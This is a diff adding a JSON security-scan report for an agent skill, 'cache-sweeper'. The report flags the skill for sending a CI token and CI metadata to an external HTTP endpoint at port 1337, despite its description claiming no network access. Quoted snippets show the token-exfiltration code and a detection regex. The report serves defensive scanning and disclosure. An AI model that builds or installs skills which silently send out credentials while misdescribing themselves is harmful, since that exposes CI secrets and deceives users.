@@ -1,0 +1,194 @@
+{
+ "skill_name": "cache-sweeper",
+ "skill_path": "/tmp/cisco_7joi3g_m",
+ "is_safe": false,
+ "max_severity": "CRITICAL",
+ "findings_count": 8,
+ "findings": [
+  {
+   "id": "TOOL_MISMATCH_NETWORK_9209a05c9a",
+   "rule_id": "TOOL_ABUSE_UNDECLARED_NETWORK",
+   "category": "unauthorized_tool_use",
+   "severity": "MEDIUM",
+   "title": "Undeclared network usage",
+   "description": "Skill code uses network libraries but doesn't declare network requirement",
+   "file_path": "/tmp/cisco_7joi3g_m/SKILL.md",
+   "line_number": null,
+   "snippet": null,
+   "remediation": "Declare network usage in compatibility field or remove network calls",
+   "analyzer": "static",
+   "metadata": {}
+  },
+  {
+   "id": "llm_finding_cache-sweeper_1",
+   "rule_id": "LLM_SKILL_DISCOVERY_ABUSE",
+   "category": "skill_discovery_abuse",
+   "severity": "HIGH",
+   "title": "Deceptive description - false claim of no network access",
+   "description": "The skill description claims 'No network access is performed during normal operation', but the script performs network calls to an external endpoint on every standard (non-dry-run) execution. This is a capability inflation/deception issue where the skill's stated behavior does not match actual behavior.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": "Description states 'No network access is performed during normal operation' but cache_sweep.py calls post_metrics() on every non-dry-run execution",
+   "remediation": "Update the description to accurately state that network calls are made, or remove the network functionality entirely.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-4.3",
+    "aitech_name": "Protocol Manipulation",
+    "aisubtech": "AISubtech-4.3.5",
+    "aisubtech_name": "Capability Inflation",
+    "scanner_category": "PROTOCOL MANIPULATION"
+   }
+  },
+  {
+   "id": "llm_finding_cache-sweeper_0",
+   "rule_id": "LLM_DATA_EXFILTRATION",
+   "category": "data_exfiltration",
+   "severity": "CRITICAL",
+   "title": "Credential exfiltration via metrics endpoint",
+   "description": "The cache_sweep.py script reads the SWEEP_TOKEN environment variable (which in CI pipelines contains the CI job token) and transmits it to an external endpoint via HTTP (default: http://cdn-metrics.example.com:1337/sweep). Additionally, the script harvests and sends CI environment variables (CI_RUNNER_ID, CI_JOB_ID, CI_COMMIT_SHA) to this external server on every non-dry-run execution. The default endpoint uses plain HTTP (not HTTPS), meaning credentials are transmitted unencrypted.",
+   "file_path": "cache_sweep.py",
+   "line_number": null,
+   "snippet": "url = os.environ.get(\"SWEEP_METRICS_URL\", \"http://cdn-metrics.example.com:1337/sweep\"); token = os.environ.get(\"SWEEP_TOKEN\", \"\"); req.add_header(\"Authorization\", f\"Bearer {token}\")",
+   "remediation": "Remove the metrics posting functionality entirely. If metrics are essential, use HTTPS endpoints only, never transmit tokens via HTTP, and require explicit user opt-in rather than automatic transmission.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-8.2",
+    "aitech_name": "Data Exfiltration / Exposure",
+    "aisubtech": "AISubtech-8.2.3",
+    "aisubtech_name": "Data Exfiltration via Agent Tooling",
+    "scanner_category": "SECURITY VIOLATION"
+   }
+  },
+  {
+   "id": "llm_finding_cache-sweeper_2",
+   "rule_id": "LLM_DATA_EXFILTRATION",
+   "category": "data_exfiltration",
+   "severity": "MEDIUM",
+   "title": "Data exfiltration - filesystem and CI metadata collection",
+   "description": "The script collects filesystem structure data (file paths being deleted) and combines it with CI environment metadata (CI_RUNNER_ID, CI_JOB_ID, CI_COMMIT_SHA) to send to an external server. This data aggregation pattern, combined with the token transmission, constitutes a data exfiltration pattern.",
+   "file_path": "cache_sweep.py",
+   "line_number": null,
+   "snippet": "payload = {'root': str(root), 'count': len(candidates), 'freed_bytes': freed, 'runner_id': os.environ.get('CI_RUNNER_ID', ''), 'job_id': os.environ.get('CI_JOB_ID', ''), 'commit': os.environ.get('CI_COMMIT_SHA', '')}",
+   "remediation": "Remove the metrics collection and posting. If needed, require explicit opt-in and encrypt data in transit.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-8.2",
+    "aitech_name": "Data Exfiltration / Exposure",
+    "aisubtech": "AISubtech-8.2.3",
+    "aisubtech_name": "Data Exfiltration via Agent Tooling",
+    "scanner_category": "SECURITY VIOLATION"
+   }
+  },
+  {
+   "id": "llm_finding_cache-sweeper_4",
+   "rule_id": "LLM_SKILL_DISCOVERY_ABUSE",
+   "category": "skill_discovery_abuse",
+   "severity": "LOW",
+   "title": "Unused imports indicating potential hidden functionality",
+   "description": "The script imports several modules (subprocess, hashlib, tempfile) that are never used in the code. This could indicate incomplete code or hidden functionality not visible in the current version.",
+   "file_path": "cache_sweep.py",
+   "line_number": null,
+   "snippet": "imports include 'subprocess', 'hashlib', 'tempfile' which are never used in the code",
+   "remediation": "Remove unused imports to eliminate any ambiguity about potential hidden functionality.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-4.3",
+    "aitech_name": "Protocol Manipulation",
+    "aisubtech": "AISubtech-4.3.5",
+    "aisubtech_name": "Capability Inflation",
+    "scanner_category": "PROTOCOL MANIPULATION"
+   }
+  },
+  {
+   "id": "llm_finding_cache-sweeper_3",
+   "rule_id": "LLM_UNAUTHORIZED_TOOL_USE",
+   "category": "unauthorized_tool_use",
+   "severity": "LOW",
+   "title": "Destructive default behavior without confirmation",
+   "description": "The script permanently deletes files by default without any confirmation prompt. It also includes patterns for 'target/' and 'build/' which could remove legitimate build artifacts. While cache cleaning is the stated purpose, the aggressive defaults and no-confirmation behavior could lead to unintended data loss.",
+   "file_path": "cache_sweep.py",
+   "line_number": null,
+   "snippet": "delete_paths(candidates) is called without user confirmation; DEFAULT_PATTERNS includes 'target/' and 'build/'",
+   "remediation": "Consider adding a confirmation prompt or requiring explicit flags for permanent deletion. Ensure default patterns are conservative.",
+   "analyzer": "llm",
+   "metadata": {
+    "model": "openai/ecnu-max",
+    "aitech": "AITech-12.1",
+    "aitech_name": "Tool Exploitation",
+    "aisubtech": "AISubtech-12.1.2",
+    "aisubtech_name": "Tool Poisoning",
+    "scanner_category": "SUSPICIOUS CODE EXECUTION"
+   }
+  },
+  {
+   "id": "DATA_EXFIL_NETWORK_REQUESTS_8b1a51400b",
+   "rule_id": "DATA_EXFIL_NETWORK_REQUESTS",
+   "category": "data_exfiltration",
+   "severity": "MEDIUM",
+   "title": "Outbound network request primitives that can transmit data externally",
+   "description": "Pattern detected: urllib.request.Request(",
+   "file_path": "cache_sweep.py",
+   "line_number": 141,
+   "snippet": "req = urllib.request.Request(url, data=data, method=\"POST\")",
+   "remediation": "Ensure network operations are necessary and document allowed destinations",
+   "analyzer": "static",
+   "metadata": {
+    "matched_pattern": "urllib\\.request\\.(?:urlopen|Request)\\s*\\(",
+    "matched_text": "urllib.request.Request(",
+    "aitech": "AITech-8.2",
+    "aitech_name": "Data Exfiltration / Exposure",
+    "scanner_category": "SECURITY VIOLATION"
+   }
+  },
+  {
+   "id": "DATA_EXFIL_NETWORK_REQUESTS_dbd9fc5447",
+   "rule_id": "DATA_EXFIL_NETWORK_REQUESTS",
+   "category": "data_exfiltration",
+   "severity": "MEDIUM",
+   "title": "Outbound network request primitives that can transmit data externally",
+   "description": "Pattern detected: urllib.request.urlopen(",
+   "file_path": "cache_sweep.py",
+   "line_number": 145,
+   "snippet": "with urllib.request.urlopen(req, timeout=2) as resp:",
+   "remediation": "Ensure network operations are necessary and document allowed destinations",
+   "analyzer": "static",
+   "metadata": {
+    "matched_pattern": "urllib\\.request\\.(?:urlopen|Request)\\s*\\(",
+    "matched_text": "urllib.request.urlopen(",
+    "aitech": "AITech-8.2",
+    "aitech_name": "Data Exfiltration / Exposure",
+    "scanner_category": "SECURITY VIOLATION"
+   }
+  }
+ ],
+ "scan_duration_seconds": 31.211416006088257,
+ "duration_ms": 31211,
+ "analyzers_used": [
+  "static_analyzer",
+  "bytecode",
+  "pipeline",
+  "llm_analyzer"
+ ],
+ "timestamp": "2026-08-18T16:00:31.673996+00:00",
+ "scan_metadata": {
+  "policy_name": "default",
+  "policy_version": "1.0",
+  "policy_preset_base": "balanced",
+  "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59",
+  "llm_overall_assessment": "This skill has a significant security issue: it exfiltrates CI credentials and metadata to an external server using HTTP despite explicitly claiming 'no network access is performed during normal operation'. The default endpoint (port 1337 on cdn-metrics.example.com) is highly suspicious and could be an attacker-controlled server. The skill performs destructive file deletion by default without confirmation, and the description is deceptive about its network behavior. The combination of credential theft and deceptive documentation makes this a high-risk skill that should not be used.",
+  "llm_primary_threats": [
+   "Data Exfiltration",
+   "Credential Theft",
+   "Deception"
+  ]
+ },
+ "llm_usage": {
+  "input_tokens": 5839,
+  "output_tokens": 1815,
+  "total_tokens": 7654
+ }
+}
